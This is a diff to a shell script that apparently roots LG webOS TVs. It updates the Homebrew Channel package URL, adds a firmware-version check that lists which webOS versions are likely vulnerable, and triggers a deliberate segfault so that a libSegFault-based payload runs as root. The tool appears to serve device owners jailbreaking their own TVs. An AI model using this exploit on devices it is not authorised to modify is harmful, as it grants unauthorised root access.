@@ -14,7 +14,7 @@ set -e
 SCRIPT_DIR="${SCRIPT_DIR:-$(dirname -- "${0}")}"
 DEBUG="${DEBUG:-}"
 IPK_SRC="${IPK_SRC:-"${SCRIPT_DIR}/hbchannel.ipk"}"
-IPK_URL='https://github.com/webosbrew/webos-homebrew-channel/releases/download/v0.7.2/org.webosbrew.hbchannel_0.7.2_all.ipk'
+IPK_URL='https://github.com/webosbrew/webos-homebrew-channel/releases/download/v0.7.3/org.webosbrew.hbchannel_0.7.3_all.ipk'
 SCRIPT_NAME='faultmanager-autoroot'
 
 PAYLOAD_LOGNAME='payload_log'
@@ -47,7 +47,7 @@ toast() {
     if is_root; then
         luna-send -w 1000 -n 1 -a "${SRC_APPID}" 'luna://com.webos.notification/createToast' "${payload}" >/dev/null
     else
-        luna-send-pub -w 1000 -n 1 -q 'sdkVersion' -f 'luna://com.webos.service.tv.systemproperty/getSystemInfo' '{"keys":["sdkVersion"]}' | sed -n -e 's/^\s*"sdkVersion":\s*"\([0-9.]\+\)"\s*$/\1/p'
+        luna-send-pub -w 1000 -n 1 'luna://com.webos.notification/createToast' "${payload}" >/dev/null
     fi
 }
 
@@ -204,7 +204,7 @@ verify_sd() {
     [ ! -f "${sd_script}" ] && return 0
 
     if [ ! -f "${sd_key}" ]; then
-        log "Expected Dev Mode public key is not present; please report this!"
+        log 'Expected Dev Mode public key is not present; please report this!'
         # Verification will fail without the public key file
         return 1
     fi
@@ -571,6 +571,9 @@ while [ "${#}" -gt 0 ]; do
             parent_pid="${3}"
             shift 2
         ;;
+        '--skip-version-check')
+            SKIP_VERSION_CHECK='arg'
+        ;;
         *)
             echo "Unknown option '${1}'"
             exit 1
@@ -624,6 +627,44 @@ add_exit_trap "cp -f -- '${logfile}' '${SCRIPT_DIR}/autoroot.log'"
 webos_version="$(get_sdkversion)"
 
 log "webOS version: ${webos_version}"
+
+if [ -n "${SKIP_VERSION_CHECK}" ]; then
+    log "Skipping version check."
+else
+    case "${webos_version}" in
+        [123].*)
+            error 'Vulnerability not present on webOS <4. (Pass --skip-version-check to bypass.)'
+            exit 1
+        ;;
+        4.*)
+            # Probably vulnerable
+        ;;
+        [5-9].*)
+            # Could be vulnerable
+            log 'note: If the exploit fails, confirm you are running vulnerable firmware.'
+        ;;
+        10.0.*)
+            # Possibly vulnerable
+            log 'note: webOS 10.0 may be vulnerable. Please let me know how it goes.'
+        ;;
+        10.[1-9]*)
+            # Highly unlikely to be vulnerable
+            error 'webOS 10.1+ is almost certainly not vulnerable. (Pass --skip-version-check to bypass.)'
+            exit 1
+        ;;
+        [1-9][0-9].*)
+            error 'This is just not going to work.'
+            exit 1
+        ;;
+        '')
+        # May signify old webOS
+            log 'warning: empty webOS version; may not be vulnerable!'
+        ;;
+        *)
+            log 'warning: unexpected webOS version format; please report this!'
+        ;;
+    esac
+fi
 
 payload_ipk="${tempdir}/${PAYLOAD_IPKNAME}"
 
@@ -728,8 +769,13 @@ trap 'sigusr1_handler' 'USR1'
 # Kill child process regardless of exit type (although not SIGINT...)
 add_exit_trap 'kill_tail'
 
+# Let people know to expect a segfault
+echo "Triggering segmentation fault..."
+
 # Crash with one of the signals handled by libSegFault
 "${crash}" -c 'import os;os.kill(os.getpid(),11)' || true
+
+# TODO: Some kind of timeout.
 
 # Display output from payload
 echo "Payload log:"
